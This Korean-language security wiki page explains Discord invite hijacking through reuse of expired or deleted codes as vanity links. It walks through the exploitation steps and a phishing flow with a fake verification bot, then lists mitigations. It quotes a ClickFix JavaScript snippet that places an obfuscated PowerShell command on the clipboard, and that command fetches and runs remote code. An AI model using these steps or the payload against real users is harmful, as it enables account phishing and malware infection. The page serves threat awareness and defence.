# Discord Invite Hijacking

Discord invite hijacking은 custom vanity link의 재사용 규칙을 악용합니다. 만료된 temporary invite code 또는 소문자와 숫자로만 구성된 삭제된 permanent code는 Level 3 Boost를 받은 서버에서 vanity link로 등록될 수 있습니다. 또한 원래 서버가 Level 3 Boost를 잃으면 custom vanity link도 다시 사용 가능해질 수 있습니다. 대문자가 포함된 temporary invite의 경우 일반 invite가 활성 상태로 유지되는 동안에도 공격자가 소문자 형태의 vanity link를 미리 등록할 수 있지만, redirection은 해당 invite가 만료된 후에만 시작됩니다.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

관찰된 risk는 invite type에 따라 다릅니다:<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | 만료 후 code를 사용할 수 있게 되며, Boost를 받은 서버가 vanity URL로 다시 등록할 수 있습니다. |
| Permanent Invite Link | ⚠️          | 삭제되었고 소문자와 숫자로만 구성된 경우, code를 다시 사용할 수 있게 될 수 있습니다.        |
| Custom Vanity Link    | ✅          | 원래 서버가 Level 3 Boost를 잃으면 해당 vanity invite를 새로 등록할 수 있게 됩니다.    |

## Exploitation Steps

1. Reconnaissance
- `discord.gg/{code}` 또는 `discord.com/invite/{code}` 패턴과 일치하는 invite link를 공개 source(forum, social media, Telegram channel)에서 모니터링합니다.<sup>[[1]](#references)</sup>
- 관심 있는 invite code(temporary 또는 vanity)를 수집합니다.<sup>[[1]](#references)</sup>
2. Pre-registration
- Level 3 Boost 권한이 있는 Discord server를 생성하거나 기존 server를 사용합니다.<sup>[[1]](#references)[[2]](#references)</sup>
- **Server Settings → Vanity URL**에서 대상 invite code를 할당합니다. 수락되면 해당 code는 malicious server가 예약하게 됩니다.<sup>[[1]](#references)</sup>
3. Hijack Activation
- temporary invite의 경우 원래 invite가 만료될 때까지 기다립니다(또는 source를 제어하고 있다면 수동으로 삭제합니다).<sup>[[1]](#references)</sup>
- 대문자가 포함된 code의 경우 소문자 variant를 즉시 claim할 수 있지만, redirection은 만료 후에만 활성화됩니다.<sup>[[1]](#references)</sup>
4. Silent Redirection
- hijack이 활성화되면 기존 link를 방문하는 사용자는 자연스럽게 attacker-controlled server로 이동됩니다.<sup>[[1]](#references)</sup>

## Phishing Flow via Discord Server

1. **#verify** channel만 표시되도록 server channel을 제한합니다.<sup>[[1]](#references)</sup>
2. bot(예: **Safeguard#0786**)을 배포하여 신규 사용자가 OAuth2를 통해 verify하도록 유도합니다.<sup>[[1]](#references)</sup>
3. CAPTCHA 또는 verification 단계로 위장하여 bot이 사용자를 phishing site(예: `captchaguard.me`)로 redirect하도록 합니다.<sup>[[1]](#references)</sup>
4. **ClickFix** UX trick을 구현합니다:<sup>[[1]](#references)</sup>
- 손상된 CAPTCHA message를 표시합니다.
- 사용자에게 **Win+R** dialog를 열고, 미리 로드된 PowerShell command를 붙여 넣은 다음 Enter를 누르도록 안내합니다.

### ClickFix Clipboard Injection Example

해당 campaign은 JavaScript를 사용하여 malicious PowerShell command를 clipboard에 복사했습니다:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
이 접근 방식은 직접적인 파일 다운로드를 피하고 익숙한 UI 요소를 활용하여 사용자의 의심을 줄입니다.<sup>[[1]](#references)</sup>

## Mitigations

- 영구 invite link를 우선 사용하고 코드에 대문자가 하나 이상 포함되도록 합니다. 대문자가 포함된 삭제된 영구 코드는 vanity link로 재사용할 수 없습니다.<sup>[[1]](#references)</sup>
- invite code를 정기적으로 교체하고 이전 link를 revoke합니다.
- Discord server의 boost 상태와 vanity URL 등록을 모니터링합니다.<sup>[[1]](#references)[[2]](#references)</sup>
- 사용자가 server의 진위 여부를 확인하고 clipboard에 붙여넣은 command를 실행하지 않도록 교육합니다.

## References

- [1] [신뢰에서 위협으로: 다단계 Malware 유포에 사용된 탈취된 Discord Invite](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Custom Invite Link – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
